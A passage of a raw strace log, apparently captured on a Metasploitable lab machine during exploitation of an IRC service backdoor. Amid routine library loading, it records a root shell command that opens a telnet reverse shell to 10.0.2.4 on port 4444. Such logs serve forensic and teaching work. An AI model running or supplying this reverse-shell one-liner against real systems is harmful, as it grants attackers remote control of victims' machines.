B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
+29839 15:04:56.606994 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
+29839 15:04:56.607049 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d4c000
+29839 15:04:56.607062 mmap2(0xb7d54000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d54000
+29839 15:04:56.607082 close(1)          = 0
+29839 15:04:56.607095 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29839 15:04:56.607109 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
+29839 15:04:56.607138 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
+29839 15:04:56.607228 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
+29839 15:04:56.607245 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d41000
+29839 15:04:56.607257 mmap2(0xb7d4a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d4a000
+29839 15:04:56.607275 close(1)          = 0
+29839 15:04:56.607297 munmap(0xb7efc000, 29913) = 0
+29839 15:04:56.607314 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
+29839 15:04:56.607328 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
+29839 15:04:56.607341 _llseek(1, 0, [0], SEEK_CUR) = 0
+29839 15:04:56.607353 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
+29839 15:04:56.607370 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f03000
+29839 15:04:56.607382 _llseek(1, 1624, [1624], SEEK_SET) = 0
+29839 15:04:56.607398 munmap(0xb7f03000, 1624) = 0
+29839 15:04:56.607409 close(1)          = 0
+29839 15:04:56.607442 getpgrp()         = 3831
+29839 15:04:56.607453 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
+29839 15:04:56.607468 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
+29839 15:04:56.607485 brk(0x8101000)    = 0x8101000
+29839 15:04:56.607583 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29839 15:04:56.607603 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29839 15:04:56.607618 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29839 15:04:56.607688 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29839 15:04:56.607708 stat64("/sbin/AB", 0xbfd2ec08) = -1 ENOENT (No such file or directory)
+29839 15:04:56.607727 stat64("/bin/AB", 0xbfd2ec08) = -1 ENOENT (No such file or directory)
+29839 15:04:56.607739 stat64("/usr/sbin/AB", 0xbfd2ec08) = -1 ENOENT (No such file or directory)
+29839 15:04:56.607751 stat64("/usr/bin/AB", 0xbfd2ec08) = -1 ENOENT (No such file or directory)
+29839 15:04:56.607765 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+29839 15:04:56.607780 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d776f8) = 29840
+29840 15:04:56.607835 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29840 15:04:56.607853 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29840 15:04:56.607866 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29840 15:04:56.607878 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29840 15:04:56.607894 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29840 15:04:56.607910 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29840 15:04:56.607924 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+29840 15:04:56.607982 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
+29840 15:04:56.608134 --- SIGPIPE (Broken pipe) @ 0 (0) ---
+29840 15:04:56.608233 exit_group(127)   = ?
+29839 15:04:56.614960 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29839 15:04:56.614960 --- SIGCHLD (Child exited) @ 0 (0) ---
+29839 15:04:56.614960 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 29840
+29839 15:04:56.614960 waitpid(-1, 0xbfd2e888, WNOHANG) = -1 ECHILD (No child processes)
+29839 15:04:56.614960 sigreturn()       = ? (mask now [])
+29839 15:04:56.614961 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29839 15:04:56.614961 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29839 15:04:56.614961 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29839 15:04:56.614961 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
+29839 15:04:56.614962 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29839 15:04:56.614962 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
+29839 15:04:56.614962 brk(0x8102000)    = 0x8102000
+29839 15:04:56.614962 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29839 15:04:56.614962 stat64("/sbin/sh", 0xbfd2ec38) = -1 ENOENT (No such file or directory)
+29839 15:04:56.614963 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+29839 15:04:56.614963 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+29839 15:04:56.614971 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+29839 15:04:56.614986 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d776f8) = 29841
+29841 15:04:56.615074 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29841 15:04:56.615106 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29841 15:04:56.615119 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29841 15:04:56.615131 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29841 15:04:56.615146 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29841 15:04:56.615162 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29841 15:04:56.615175 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+29841 15:04:56.615208 execve("/bin/sh", ["sh", "-c", "(sleep 4172|telnet 10.0.2.4 4444|while : ; do sh && break; done 2>&1|telnet 10.0.2.4 4444 >/dev/null 2>&1 &)"], [/* 14 vars */]) = 0
+29841 15:04:56.615288 brk(0)            = 0x80f9000
+29841 15:04:56.615309 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29841 15:04:56.615325 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f59000
+29841 15:04:56.615341 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+29841 15:04:56.615357 open("/etc/ld.so.cache", O_RDONLY) = 1
+29841 15:04:56.615370 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
+29841 15:04:56.615387 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f51000
+29841 15:04:56.615397 close(1)          = 0
+29841 15:04:56.615408 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29841 15:04:56.615423 open("/lib/libncurses.so.5", O_RDONLY) = 1
+29841 15:04:56.615442 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
+29841 15:04:56.615547 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+29841 15:04:56.615588 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f21000
+29841 15:04:56.615615 mmap2(0xb7f4e000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f4e000
+29841 15:04:56.615632 close(1)          = 0
+29841 15:04:56.615644 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29841 15:04:56.615658 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
+29841 15:04:56.615673 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
+29841 15:04:56.615762 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+29841 15:04:56.615780 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f1d000
+29841 15:04:56.615792 mmap2(0xb7f1f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f1f000
+29841 15:04:56.615807 close(1)          = 0
+29841 15:04:56.615818 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29841 15:04:56.615832 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
+29841 15:04:56.615846 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
+29841 15:04:56.615939 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+29841 15:04:56.615956 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f1c000
+29841 15:04:56.615970 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dcd000
+29841 15:04:56.615981 mmap2(0xb7f16000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f16000
+29841 15:04:56.616007 mmap2(0xb7f19000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f19000
+29841 15:04:56.616022 close(1)          = 0
+29841 15:04:56.616046 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dcc000
+29841 15:04:56.616058 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dcc6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+29841 15:04:56.616113 mprotect(0xb7f16000, 4096, PROT_READ) = 0
+29841 15:04:56.616149 munmap(0xb7f51000, 29913) = 0
+29841 15:04:56.616174 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29841 15:04:56.616188 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
+29841 15:04:56.616208 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfede120) = -1 ENOTTY (Inappropriate ioctl for device)
+29841 15:04:56.616233 brk(0)            = 0x80f9000
+29841 15:04:56.616242 brk(0x80fa000)    = 0x80fa000
+29841 15:04:56.616254 brk(0x80fb000)    = 0x80fb000
+29841 15:04:56.616270 getuid32()        = 0
+29841 15:04:56.616280 getgid32()        = 0
+29841 15:04:56.616289 geteuid32()       = 0
+29841 15:04:56.616299 getegid32()       = 0
+29841 15:04:56.616312 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29841 15:04:56.616325 time(NULL)        = 1495652696
+29841 15:04:56.616337 brk(0x80fc000)    = 0x80fc000
+29841 15:04:56.616352 brk(0x80fd000)    = 0x80fd000
+29841 15:04:56.616370 open("/proc/meminfo", O_RDONLY) = 1
+29841 15:04:56.616391 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
+29841 15:04:56.616410 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f58000
+29841 15:04:56.616421 read(1, "MemTotal:      1035240 kB\nMemFree:         52832 kB\nBuffers:        114564 kB\nCached:         392952 kB\nSwapCached:          0 kB\nActive:         438476 kB\nInactive:       400956 kB\nHighTotal:      131008 kB\nHighFree:          248 kB\nLowTotal:       904232 kB\nLowFree:         52584 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            2264 kB\nWriteback:           0 kB\nAnonPages:      331904 kB\nMapped:          52112 kB\nSlab:            83476 kB\nSReclaimable:    21672 kB\nSUnreclaim:      61804 kB\nPageTables:      25332 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:  1110388 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
+29841 15:04:56.616509 close(1)          = 0
+29841 15:04:56.616528 munmap(0xb7f58000, 4096) = 0
+29841 15:04:56.616542 brk(0x80fe000)    = 0x80fe000
+29841 15:04:56.616605 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29841 15:04:56.616619 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29841 15:04:56.616632 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29841 15:04:56.616644 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29841 15:04:56.616656 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
+29841 15:04:56.616682 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+29841 15:04:56.616700 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29841 15:04:56.616712 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29841 15:04:56.616725 uname({sys="Linux", node="metasploitable", ...}) = 0
+29841 15:04:56.616773 stat64("/etc/unreal", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29841 15:04:56.616793 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29841 15:04:56.616811 getpid()          = 29841
+29841 15:04:56.616827 getppid()         = 29839
+29841 15:04:56.616843 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29841 15:04:56.616863 stat64("/sbin/sh", 0xbfede0f8) = -1 ENOENT (No such file or directory)
+29841 15:04:56.616876 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+29841 15:04:56.616893 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+29841 15:04:56.616917 socket(PF_FILE, SOCK_STREAM, 0) = 1
+29841 15:04:56.616931 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+29841 15:04:56.616943 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+29841 15:04:56.616965 close(1)          = 0
+29841 15:04:56.616977 socket(PF_FILE, SOCK_STREAM, 0) = 1
+29841 15:04:56.616996 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+29841 15:04:56.617008 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+29841 15:04:56.617027 close(1)          = 0
+29841 15:04:56.617042 open("/etc/nsswitch.conf", O_RDONLY) = 1
+29841 15:04:56.617056 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
+29841 15:04:56.617073 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f58000
+29841 15:04:56.617084 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
+29841 15:04:56.617134 read(1, "", 4096) = 0
+29841 15:04:56.617144 close(1)          = 0
+29841 15:04:56.617153 munmap(0xb7f58000, 4096) = 0
+29841 15:04:56.617170 open("/etc/ld.so.cache", O_RDONLY) = 1
+29841 15:04:56.617182 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
+29841 15:04:56.617199 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f51000
+29841 15:04:56.617209 close(1)          = 0
+29841 15:04:56.617220 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29841 15:04:56.617234 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
+29841 15:04:56.617249 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
+29841 15:04:56.617339 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
+29841 15:04:56.617356 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc3000
+29841 15:04:56.617371 mmap2(0xb7dca000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7dca000
+29841 15:04:56.617389 close(1)          = 0
+29841 15:04:56.617401 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29841 15:04:56.617414 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
+29841 15:04:56.617428 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 